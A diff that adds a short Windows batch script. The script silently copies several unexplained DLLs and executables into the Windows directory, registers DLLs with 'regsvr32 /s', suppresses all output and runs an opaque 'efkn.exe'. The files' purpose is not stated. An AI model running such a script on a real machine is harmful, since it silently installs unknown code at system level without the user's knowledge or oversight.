@@ -1,0 +1,18 @@
+copy ntspkfnd.dll %windir%   >nul
+%windir%\system32\regsvr32.exe /s %windir%\ntspkfnd.dll
+
+copy optnet.dll %windir%
+regsvr32.exe /s optnet.dll
+
+efkn.exe %windir%\hostctrl.dll    hostctrl
+efkn.exe %windir%\hstsys.dll    hstsys
+ 
+copy hostctrl.dll       %windir%\hostctrl.dll     >nul
+copy hstsys.dll       %windir%\hstsys.dll     >nul
+
+nmcuninstall.exe reg
+copy nmcuninstall.exe %windir%  >nul
+
+efkn.exe reqgn
+
+:exit
